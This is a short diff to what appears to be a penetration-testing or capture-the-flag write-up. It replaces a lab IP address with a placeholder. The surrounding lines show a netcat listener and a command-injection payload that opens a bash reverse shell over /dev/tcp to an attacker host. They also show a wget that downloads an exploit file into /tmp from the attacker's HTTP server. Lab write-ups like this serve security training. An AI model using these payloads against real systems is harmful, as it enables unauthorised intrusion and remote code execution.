@@ -103,7 +103,7 @@ nc -lvnp 4444
 ### Payload:
 
 ```
-127.0.0.1; bash -i >& /dev/tcp/192.168.3.128/4444 0>&1
+127.0.0.1; bash -i >& /dev/tcp/192.168.3.x/4444 0>&1
 ```
 
 ✔️ Shell obtained
@@ -137,7 +137,7 @@ python3 -m http.server 8000
 
 ```
 cd /tmp
-wget http://192.168.3.128:8000/exploit2.c
+wget http://192.168.3.x:8000/exploit2.c
 ```
 
 ---
